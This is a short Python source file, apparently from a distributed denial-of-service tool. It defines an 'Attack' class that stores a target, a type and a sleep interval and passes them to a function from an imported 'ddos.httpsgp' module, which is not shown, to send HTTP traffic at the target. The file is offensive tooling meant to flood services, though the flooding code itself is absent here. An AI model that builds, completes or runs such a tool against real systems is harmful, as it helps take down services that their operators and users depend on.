import ddos.httpsgp as httpsgp

class Attack:

    def __init__(self, target, tipe, sleep) -> None:
        self.target = target
        self.tipe = tipe
        self.sleep = sleep

    def https(self, target, **kwargs):
        return httpsgp.Http.send(self.target, self.tipe, self.sleep)
